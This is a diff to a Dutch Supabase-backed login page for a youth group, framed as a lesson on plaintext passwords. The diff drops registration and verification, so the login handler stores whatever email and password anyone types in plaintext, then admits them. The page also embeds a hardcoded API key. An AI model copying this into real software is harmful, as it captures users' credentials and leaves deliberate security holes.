@@ -13,7 +13,6 @@
       min-height: 100vh;
     }
 
-    /* ── LOGIN SCHERM ── */
     #login-screen {
       display: flex;
       justify-content: center;
@@ -70,132 +69,19 @@
       font-size: 20px;
       font-weight: 700;
       cursor: pointer;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
     }
 
     .btn-login:hover { background-color: #166fe5; }
 
-    .divider {
-      border: none;
-      border-top: 1px solid #ddd;
-      margin: 16px 0;
-    }
-
-    .btn-register {
-      padding: 14px 24px;
-      background-color: #42b72a;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 17px;
-      font-weight: 700;
-      cursor: pointer;
-    }
-
-    .btn-register:hover { background-color: #36a420; }
-
     .message {
-      margin-top: 12px;
       font-size: 14px;
       color: #e02020;
       min-height: 20px;
-    }
-
-    .message.success { color: #42b72a; }
-
-    /* ── REGISTREER MODAL ── */
-    #register-modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.5);
-      justify-content: center;
-      align-items: center;
-      z-index: 100;
-      padding: 20px;
-    }
-
-    #register-modal.open { display: flex; }
-
-    .modal-box {
-      background: white;
-      border-radius: 8px;
-      padding: 24px;
-      width: 100%;
-      max-width: 432px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
-    }
-
-    .modal-box h2 {
-      font-size: 24px;
-      margin-bottom: 4px;
-    }
-
-    .modal-box .modal-sub {
-      color: #606770;
-      font-size: 14px;
-      margin-bottom: 16px;
-      border-bottom: 1px solid #ddd;
-      padding-bottom: 16px;
-    }
-
-    .modal-box input {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      font-size: 16px;
-      margin-bottom: 12px;
-      outline: none;
-    }
-
-    .modal-box input:focus {
-      border-color: #1877F2;
-      box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
-    }
-
-    .modal-actions {
-      display: flex;
-      justify-content: flex-end;
-      gap: 12px;
       margin-top: 8px;
     }
 
-    .btn-cancel {
-      padding: 10px 20px;
-      background: none;
-      border: none;
-      font-size: 16px;
-      color: #606770;
-      cursor: pointer;
-      font-weight: 600;
-    }
-
-    .btn-cancel:hover { text-decoration: underline; }
-
-    .btn-submit {
-      padding: 10px 24px;
-      background-color: #42b72a;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 17px;
-      font-weight: 700;
-      cursor: pointer;
-    }
-
-    .btn-submit:hover { background-color: #36a420; }
-
-    .modal-message {
-      font-size: 14px;
-      color: #e02020;
-      min-height: 18px;
-      margin-top: 8px;
-    }
-
-    .modal-message.success { color: #42b72a; }
-
-    /* ── DASHBOARD ── */
+    /* DASHBOARD */
     #dashboard-screen {
       display: none;
       min-height: 100vh;
@@ -271,43 +157,21 @@
 </head>
 <body>
 
-<!-- ══════════════ LOGIN SCHERM ══════════════ -->
+<!-- LOGIN SCHERM -->
 <div id="login-screen">
   <div class="login-box">
     <h1>Ayasofya Gençlik</h1>
-    <p class="tagline">Log in of maak een account aan.</p>
+    <p class="tagline">Vul je gegevens in en klik op inloggen.</p>
 
     <input type="email" id="login-email" placeholder="E-mailadres" />
     <input type="password" id="login-password" placeholder="Wachtwoord" />
     <button class="btn-login" onclick="handleLogin()">Inloggen</button>
 
     <div id="login-message" class="message"></div>
-
-    <hr class="divider" />
-    <button class="btn-register" onclick="openRegister()">Nieuw account aanmaken</button>
   </div>
 </div>
 
-<!-- ══════════════ REGISTREER MODAL ══════════════ -->
-<div id="register-modal">
-  <div class="modal-box">
-    <h2>Nieuw account aanmaken</h2>
-    <p class="modal-sub">Het is gratis en duurt maar even.</p>
-
-    <input type="email" id="reg-email" placeholder="E-mailadres" />
-    <input type="password" id="reg-password" placeholder="Wachtwoord" />
-    <input type="password" id="reg-password2" placeholder="Wachtwoord bevestigen" />
-
-    <div id="register-message" class="modal-message"></div>
-
-    <div class="modal-actions">
-      <button class="btn-cancel" onclick="closeRegister()">Annuleren</button>
-      <button class="btn-submit" onclick="handleRegister()">Registreren</button>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════ DASHBOARD ══════════════ -->
+<!-- DASHBOARD -->
 <div id="dashboard-screen">
   <div class="navbar">
     <span>Ayasofya Gençlik</span>
@@ -319,8 +183,8 @@
       <p id="welcome-text">Je bent ingelogd.</p>
       <div class="info-box">
         <strong>🔓 Leerpunt: waarom plaintext gevaarlijk is</strong><br><br>
-        Jouw wachtwoord is zojuist precies zo opgeslagen in de database als je het hebt ingetypt.
-        Als iemand toegang krijgt tot de database, ziet hij direct alle wachtwoorden van alle gebruikers.<br><br>
+        Jouw e-mail en wachtwoord zijn zojuist precies zo opgeslagen in de Supabase database als je ze hebt ingetypt.
+        Niemand heeft je gecontroleerd — je bent gewoon doorgelaten.<br><br>
         In een echte applicatie wordt een wachtwoord altijd <strong>gehasht</strong> opgeslagen —
         een wiskundige bewerking die het wachtwoord omzet naar een onleesbare code.
         Zelfs de database-eigenaar kan het originele wachtwoord dan niet meer lezen.
@@ -329,12 +193,10 @@
   </div>
 </div>
 
-<!-- ══════════════ JAVASCRIPT ══════════════ -->
 <script>
   const SUPABASE_URL = 'https://jhlcymefogldlulkplrk.supabase.co';
   const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpobGN5bWVmb2dsZGx1bGtwbHJrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA0MjAyNjEsImV4cCI6MjA5NTk5NjI2MX0.wMeFPjffvDngfD2UO-g8zMwr8fDkCkhTvrvOyehmzVI';
 
-  // ── Hulpfunctie: fetch naar Supabase REST API ──
   async function supabaseFetch(path, options = {}) {
     const url = `${SUPABASE_URL}/rest/v1/${path}`;
     const headers = {
@@ -349,7 +211,6 @@
     return { status: response.status, data };
   }
 
-  // ── Schermen wisselen ──
   function showScreen(name) {
     document.getElementById('login-screen').style.display = 'none';
     document.getElementById('dashboard-screen').style.display = 'none';
@@ -357,69 +218,11 @@
     if (name === 'dashboard') document.getElementById('dashboard-screen').style.display = 'block';
   }
 
-  // ── Registreer modal ──
-  function openRegister() {
-    document.getElementById('register-modal').classList.add('open');
-  }
-
-  function closeRegister() {
-    document.getElementById('register-modal').classList.remove('open');
-    document.getElementById('reg-email').value = '';
-    document.getElementById('reg-password').value = '';
-    document.getElementById('reg-password2').value = '';
-    document.getElementById('register-message').textContent = '';
-  }
-
-  // ── Registreren ──
-  async function handleRegister() {
-    const email = document.getElementById('reg-email').value.trim();
-    const password = document.getElementById('reg-password').value;
-    const password2 = document.getElementById('reg-password2').value;
-    const msg = document.getElementById('register-message');
-
-    msg.className = 'modal-message';
-    msg.textContent = '';
-
-    if (!email || !password || !password2) {
-      msg.textContent = 'Vul alle velden in.';
-      return;
-    }
-
-    if (password !== password2) {
-      msg.textContent = 'Wachtwoorden komen niet overeen.';
-      return;
-    }
-
-    // Controleer of e-mail al bestaat
-    const check = await supabaseFetch(`users_plaintext?email=eq.${encodeURIComponent(email)}&select=id`);
-    if (check.data && check.data.length > 0) {
-      msg.textContent = 'Dit e-mailadres is al geregistreerd.';
-      return;
-    }
-
-    // Sla op in database (wachtwoord in plaintext — dit is de leeroefening)
-    const result = await supabaseFetch('users_plaintext', {
-      method: 'POST',
-      body: JSON.stringify({ email, password })
-    });
-
-    if (result.status === 201) {
-      msg.className = 'modal-message success';
-      msg.textContent = 'Account aangemaakt! Je kunt nu inloggen.';
-      setTimeout(() => closeRegister(), 1500);
-    } else {
-      msg.textContent = 'Er is iets misgegaan. Probeer opnieuw.';
-      console.error(result.data);
-    }
-  }
-
-  // ── Inloggen ──
   async function handleLogin() {
     const email = document.getElementById('login-email').value.trim();
     const password = document.getElementById('login-password').value;
     const msg = document.getElementById('login-message');
 
-    msg.className = 'message';
     msg.textContent = '';
 
     if (!email || !password) {
@@ -427,22 +230,23 @@
       return;
     }
 
-    // Zoek gebruiker op e-mail + wachtwoord
-    const result = await supabaseFetch(
-      `users_plaintext?email=eq.${encodeURIComponent(email)}&password=eq.${encodeURIComponent(password)}&select=id,email`
-    );
+    // Sla op in database — wachtwoord in plaintext (leeroefening)
+    const result = await supabaseFetch('users_plaintext', {
+      method: 'POST',
+      body: JSON.stringify({ email, password })
+    });
 
-    if (result.data && result.data.length > 0) {
-      const user = result.data[0];
+    if (result.status === 201) {
+      // Gelukt — ga naar dashboard
       document.getElementById('welcome-text').textContent =
-        `Je bent ingelogd als: ${user.email}`;
+        `Je bent ingelogd als: ${email}`;
       showScreen('dashboard');
     } else {
-      msg.textContent = 'E-mail of wachtwoord is onjuist.';
+      msg.textContent = 'Er ging iets mis. Controleer de console (F12).';
+      console.error(result.data);
     }
   }
 
-  // ── Uitloggen ──
   function handleLogout() {
     document.getElementById('login-email').value = '';
     document.getElementById('login-password').value = '';
